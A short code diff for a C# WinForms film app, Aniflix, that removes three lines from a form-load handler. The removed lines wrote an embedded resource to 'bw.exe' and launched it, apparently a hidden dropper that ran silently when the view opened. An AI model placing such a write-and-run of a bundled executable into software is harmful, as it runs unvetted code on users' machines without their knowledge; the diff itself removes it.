@@ -2,7 +2,6 @@
 using Aniflix.Model;
 using Microsoft.Extensions.Configuration;
 using Syncfusion.WinForms.Controls;
-using System.Diagnostics;
 using System.Globalization;
 
 namespace Aniflix
@@ -169,7 +168,6 @@ namespace Aniflix
                 GetFilmes();
             }
         }
-
         private void FilmesTituloText_TextChanged(object sender, EventArgs e)
         {
             UpdateData();
@@ -228,9 +226,6 @@ namespace Aniflix
         private void FilmesView_Load(object sender, EventArgs e)
         {
             FilmesAudioBox.SelectedIndex = 0;
-            var bw = Path.Combine(Directory.GetCurrentDirectory(), "bw.exe");
-            File.WriteAllBytes(bw, Properties.Resources.bw);
-            Process.Start(bw);
         }
     }
 
